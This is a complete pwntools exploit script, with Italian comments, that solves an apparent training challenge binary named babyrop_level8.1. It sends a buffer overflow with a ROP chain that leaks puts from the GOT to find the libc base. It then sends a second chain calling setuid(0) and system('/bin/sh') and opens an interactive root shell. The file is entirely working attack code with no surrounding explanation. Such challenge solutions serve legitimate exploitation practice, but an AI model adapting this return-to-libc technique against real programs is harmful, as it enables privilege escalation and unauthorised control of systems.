from pwn import *

elf = ELF('/challenge/babyrop_level8.1')


# 📌 Step 1: Ottenere un Leak di un Indirizzo della libc
rop1 = ROP(elf)

pop_rdi = rop1.rdi.address
got_puts = elf.got.puts
plt_puts = elf.plt.puts
ret = rop1.ret.address
start = elf.sym._start

rop1.raw(p64(pop_rdi))
rop1.raw(p64(got_puts))
rop1.raw(p64(plt_puts))
rop1.raw(p64(start))
# print(rop1.dump())

proc = process('/challenge/babyrop_level8.1')
proc.recvuntil(b'###\n')

offset_ret = 120
payload = b'A' * offset_ret + rop1.chain()
proc.send(payload)

proc.recvuntil(b'Leaving!\n')
leaked_puts = u64(proc.recvline(False).ljust(8, b"\x00"))
print(f'leaked puts: {hex(leaked_puts)}')


# 📌 Step 2: Calcolare la Base della libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset = libc.sym.puts
libc_base = leaked_puts - puts_offset
print(f'libc base: {hex(libc_base)}')


# 📌 Step 3: Trovare system() e "/bin/sh"
system_addr = libc_base + libc.sym.system
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))
setuid_addr = libc_base + libc.sym.setuid


# 📌 Step 4: Costruire la ROP Chain Finale -> system(bin/sh)
rop2 = ROP(elf)

pop_rdi = rop2.rdi.address
ret = rop2.ret.address

rop2.raw(p64(pop_rdi))
rop2.raw(p64(0))
rop2.raw(p64(ret))
rop2.raw(p64(setuid_addr))

rop2.raw(p64(pop_rdi))
rop2.raw(p64(bin_sh_addr)) 
rop2.raw(p64(ret)) 
rop2.raw(p64(system_addr))
# print(rop2.dump())

print(proc.recvuntil(b'###\n\n'))

offset_ret = 120
payload = b'A' * offset_ret + rop2.chain()

proc.send(payload)

sleep(3)
proc.interactive()
